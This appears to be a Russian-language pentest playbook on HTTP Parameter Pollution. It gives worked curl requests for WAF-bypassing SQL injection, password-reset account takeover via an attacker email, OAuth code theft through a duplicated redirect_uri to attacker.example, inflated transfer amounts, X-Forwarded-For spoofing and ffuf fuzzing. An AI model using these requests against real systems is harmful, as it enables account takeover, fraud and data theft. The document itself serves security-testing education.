HTTP Parameter Pollution (HPP) — это передача одного и того же параметра **несколько раз**, когда разные компоненты стека берут разные значения. `?id=1&id=2` может означать «1» для WAF и «2» для бэкенда (или наоборот), что открывает обход фильтров, подмену значений и даже инъекции. Смежная тема — **parameter smuggling**: расхождение в том, какие параметры видит фронт и бэк.

## Теория: кто что берёт

| Стек | `?a=1&a=2` → берёт |
|------|---------------------|
| PHP / Apache | последнее (`2`) |
| ASP.NET / IIS | `1,2` (склейка запятой) |
| Node/Express (qs) | массив `['1','2']` |
| Python/Django | последнее (`2`) |
| Python/Flask (request.args) | первое (`1`) |
| Java Servlet `getParameter` | первое (`1`) |
| WAF (ModSecurity/Cloudflare) | обычно первое или последнее |

Расхождение — основа атак: если WAF проверяет первое значение, а приложение берёт последнее (или наоборот), вредоносное значение проходит.

## Вектор 1: обход WAF

WAF видит `id=1` (чистое), приложение — `id=1' OR 1=1--`:

```bash
curl -s "https://app.example/item?id=1&id=1%27%20OR%201=1--"
```

Или наоборот — если WAF берёт последнее, а приложение первое. Перебор комбинаций: `safe&evil`, `evil&safe`, `safe,evil`, `evil,safe`.

## Вектор 2: обход логики/фильтров

- Проверка на фронте (`role=user`) проходит, бэкенд берёт второе (`role=admin`).
- Лимит суммы/количества: `amount=1&amount=999`.
- Флаг/роль: `isAdmin=false&isAdmin=true`.
- Email: `email=victim@x&email=attacker@x`.

## Вектор 3: parameter smuggling

Иногда фронт (reverse proxy) и бэкенд по-разному режут query/body:

```http
GET /api?x=1%26y=2 HTTP/1.1
```

Разные парсеры (`&` в значении vs разделитель), дублирование через `;` (Java/Tomcat `;` как разделитель), рассинхрон body/query. Это близко к request smuggling (см. `web-request-smuggling`).

## Вектор 4: инъекция через конкатенацию (ASP.NET)

ASP.NET склеивает дублированные параметры через запятую: `?q=a&q=b` → `a,b`. Если значение уходит в SQL/HQL, можно подсунуть инъекцию:

```text
?q=1&q=,(SELECT ...)
?q=admin&q=)or(1=1
```

## Разобранный пример: обход WAF на SQLi

Цель: `GET /item?id=1` (WAF блокирует `'`). WAF читает первое значение, приложение — последнее.

Шаг 1 — проверяем, что дублирование проходит WAF:

```bash
curl -s "https://app.example/item?id=1&id=1"
```

Шаг 2 — подсовываем инъекцию во второе значение:

```bash
curl -s "https://app.example/item?id=1&id=1%27%20OR%20%271%27=%271"
```

Шаг 3 — если сработало, дальше как обычная SQLi (см. `web-tool-sqlmap`, `web-playbooks-injection`).

## Разобранный пример: HPP в сбросе пароля

Форма сброса принимает `email`. Фронт проверяет первый `email`, бэкенд берёт последний:

```bash
curl -s -X POST https://app.example/reset \
  --data 'email=victim@corp.com&email=attacker@evil.com'
```

Если письмо со ссылкой сброса уходит на `attacker@evil.com` — захват аккаунта. Аналогично с `user_id`, `token`.

## Обходы и вариации

- Кодирование: `%26` (`&`), `%3B` (`;`), `%23` (`#`), двойное кодирование.
- Разные разделители: `&`, `;`, `,`, повтор параметра.
- Смешение query и body: параметр и в URL, и в теле.
- Разный регистр: `ID` vs `id`.
- Массивы: `id[]=1&id[]=2` (PHP/Node) — приложение берёт массив.

## Инструменты

- **Burp Repeater/Intruder** — ручное дублирование и перебор.
- **Burp «Param Miner»** — поиск скрытых параметров.
- **`curl`** — точечные запросы.
- **`ffuf`** — параметр-фаззинг.

## Что дальше / decision

1. Есть WAF/фильтр → попробуйте дублировать параметр с «чистым» и «грязным» значением.
2. Логика проверяется на фронте → подмените значение вторым параметром.
3. ASP.NET → помните про склейку через запятую.
4. Query/body рассинхрон → копайте в сторону parameter smuggling/request smuggling.
5. Сработало → зафиксируйте PoC (два значения + результат).

## Частые ошибки

- **Забыть, кто берёт первое/последнее.** Зависит от стека — тестируйте.
- **Путать HPP и request smuggling.** HPP — про дубли параметров, smuggling — про границы запроса.
- **Не проверить кодирование.** `%26`/`%3B` иногда нужны.
- **Игнорировать ASP.NET-склейку.** Запятая даёт инъекцию.
- **Ломать прод.** Только с согласия.

## HPP в разных языках и фреймворках: полная таблица

Ядро HPP — расхождение в том, какое из дублированных значений выбирает каждый компонент. Ниже сводка по популярным стекам: важно не только «первое/последнее», но и форма, в которую превращается параметр.

| Технология | `?a=1&a=2` | Форма значения | Особенность |
|-----------|------------|----------------|-------------|
| PHP (mod_php) | `2` | строка | `a[]=1&a[]=2` → массив |
| PHP (php-fpm, часть SAPI) | `2` | строка | зависит от SAPI |
| Node.js + `qs` | `['1','2']` | массив | `a[b]=1` → объект, вложенность |
| Node.js + `querystring` | `['1','2']` | массив | без вложенности |
| Express (extended) | `['1','2']` | массив/объект | риск prototype pollution |
| ASP.NET Core | `1,2` | склейка | тип `StringValues` |
| ASP.NET MVC | `1,2` | склейка | model binding в строку |
| Flask (`request.args`) | `1` | первое | `getlist` вернёт список |
| Django (`QueryDict`) | `2` | последнее | `getlist` вернёт список |
| FastAPI | `1` | первое | pydantic валидирует дубли |
| Java Servlet | `1` | первое | `getParameterValues` → массив |
| Spring MVC | `1` | первое | binding в список |
| Ruby on Rails | `2` | последнее | Rack `parse_nested_query` |
| Go `net/http` | `1` | первое | `r.URL.Query().Get` |
| Go (gorilla/schema) | `1` | первое | срезы через `,` |
| nginx `$arg_` | `1` | первое | только первое значение |

Практический вывод: **до атаки определите, кто берёт первое, а кто последнее**. Делается это без инъекции — запросите эндпоинт, отражающий значение (поиск, эхо, редирект), и передайте `?q=AAA&q=BBB`: увидите, какое из них вернётся.

## Разобранный пример: HPP в JSON API и вложенных объектах

Многие считают, что HPP — только про query string. Но тот же принцип работает в `application/x-www-form-urlencoded` и даже в JSON, если парсер допускает дубли ключей.

```bash
# form-urlencoded: сервер возьмёт последнее значение
curl -s -X POST https://api.example/v1/transfer \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'amount=10&amount=100000'
# вывод: {"status":"ok","amount":100000}
```

В JSON формально дубли ключей запрещены, но многие парсеры (Java Jackson с `ALLOW_DUPLICATE_KEYS` по умолчанию берёт последнее, Go `encoding/json` — последнее) молча принимают их:

```bash
curl -s -X POST https://api.example/v1/withdraw \
  -H 'Content-Type: application/json' \
  -d '{"amount":1,"amount":999999}'
# {"balance_after":-999899}
```

Node.js с `qs` позволяет вложенность, что открывает ещё один слой: `user[role]=user&user[role]=admin` даст массив, а `user[role][]=user` — вложенный список, который backend может «сплющить» непредсказуемо.

## Разобранный пример: HPP в OAuth/OIDC

OAuth-флоу — классическое место, где дублирование ломает проверки. Значения `redirect_uri`, `scope`, `state`, `client_id` проверяются сервером авторизации, но приложение-клиент может брать другое значение.

```bash
# сервер авторизации проверяет redirect_uri=allowed.example (первое)
# клиент берёт последнее -> код утекает на attacker.example
https://auth.example/authorize?client_id=app\
&redirect_uri=https://app.example/cb\
&redirect_uri=https://attacker.example/steal\
&response_type=code&scope=openid&state=x
```

Аналогично с `scope`: если проверка WAF видит `scope=read`, а сервер берёт последнее `scope=admin`, токен получит лишние права. Всегда проверяйте, **на каком слое** валидируется каждое OAuth-поле.

## Комбинирование с кодировками и дублированием заголовков

Чистого дублирования часто мало — WAF его тоже видит. Комбинируйте с кодированием и другими каналами рассогласования:

```bash
# разные представления одного имени
curl -s 'https://app.example/s?q=safe&Q=evil'
curl -s 'https://app.example/s?q=safe&q%00=evil'      # null-byte в имени
curl -s 'https://app.example/s?q=safe&%71=evil'       # percent-encoded имя
curl -s 'https://app.example/s?q=safe&q=evil&q='      # пустое последнее
# дублирование заголовков (HPP-эффект на уровне headers)
curl -s https://app.example/ -H 'X-Forwarded-For: 1.1.1.1' -H 'X-Forwarded-For: 127.0.0.1'
```

Смешивание query и body — отдельный мощный вектор: прокси смотрит на URL, а приложение — на тело (или наоборот). `GET` с телом, `POST` с query-параметрами и `multipart` — всё это разные парсеры с разным поведением.

## Автоматизация: ffuf, Burp и nuclei

Ручной перебор комбинаций быстро надоедает — автоматизируйте.

```bash
# ffuf: дублирование параметра чистое/грязное значение
ffuf -u 'https://app.example/item?id=1FUZZ' -w /tmp/payloads.txt \
  -mc all -fs 0
# payloads.txt содержит: &id=2 , %26id=2 , ;id=2 , &id[]=2

# сравнение ответов для «чистого» и «грязного» варианта
ffuf -u 'https://app.example/item?id=SAFE&id=FUZZ' -w ids.txt -mr 'admin'
```

В Burp Repeater дублируйте параметр вручную и включайте **«Param Miner»** для поиска скрытых параметров. В Intruder используйте тип payload «Runtime file» со списком разделителей (`&`, `;`, `%26`, `%3B`). Для массовой проверки HPP-оракулов удобно писать простой скрипт на Python `requests`, сравнивающий длины/статусы ответов.

## Что делать дальше / решение

1. **Определите оракул.** Найдите эндпоинт, который отражает значение параметра. Без оракула HPP не подтвердить.
2. **Зафиксируйте поведение парсеров.** Передайте `q=AAA&q=BBB` и посмотрите, что вернулось — так вы узнаёте «первое или последнее».
3. **Ищите расхождение WAF↔backend.** Если WAF берёт первое, а backend последнее — подсовывайте полезную нагрузку во второе.
4. **Проверьте логические поля.** `role`, `isAdmin`, `user_id`, `amount`, `email`, `redirect_uri` — приоритетные цели.
5. **Комбинируйте.** Кодировки, `;`, `%00`, дублирование заголовков, query+body.
6. **Зафиксируйте PoC.** Два значения + наблюдаемый результат (обход фильтра, захват аккаунта, изменение суммы). Только после этого — `confirmed`.
